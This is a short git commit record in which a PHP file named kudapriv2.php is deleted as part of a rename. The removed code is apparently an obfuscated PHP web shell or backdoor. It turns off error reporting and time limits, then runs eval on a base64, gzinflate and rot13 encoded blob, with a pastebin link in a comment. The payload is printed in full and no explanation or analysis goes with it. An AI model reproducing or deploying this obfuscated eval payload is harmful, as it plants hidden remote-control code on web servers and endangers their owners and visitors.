4c32b5f77d9087bca7faeb451f6a8b40fe0048ee
mrxbarakuda <32748674+mrxbarakuda@users.noreply.github.com>
2018-05-03 19:13:19 +0700

    Update and rename kudapriv2.php to kudapriv.php

--- kudapriv2.php
+++
@@ -1,8 +0,0 @@
-<?php
-/*https://pastebin.com/raw/BUsBUXYK*/
-session_start();
-error_reporting(0);
-set_time_limit(0);
-date_default_timezone_set('Asia/Jakarta');
-eval(gzinflate(str_rot13(gzinflate(base64_decode('AfUACv8NwVhlgjAAANDjVYeFDYLKZ1w4Il+VoIkgGwfCVBBZCQExp2Lfy8ekkVdEvYom4bnUZml0lIOFlCZ9vkfvTEF1llgzg7ADo857vzUCMZlhTFte7ODF4dW+Hqgydx2fRT15m4tp2hWI6ckHTUIlhR4c7NXt5LEWUZ0SzhVpHUUeEfA7QB7chBoJEYIOib0z+jcQlhxaKXjRYa4Bap2ejcqfKN6a6yq36ef6R+X9qMH6Tm6fAVLGMqsQdLaLyaISne1O4usuD9Qg9nBjlDUlmGL9g0Y3gdUds+hZMO2FlxiE74oVvyy/+5gNuA855OZ7s5l9/fv5Aw==')))));
-?>
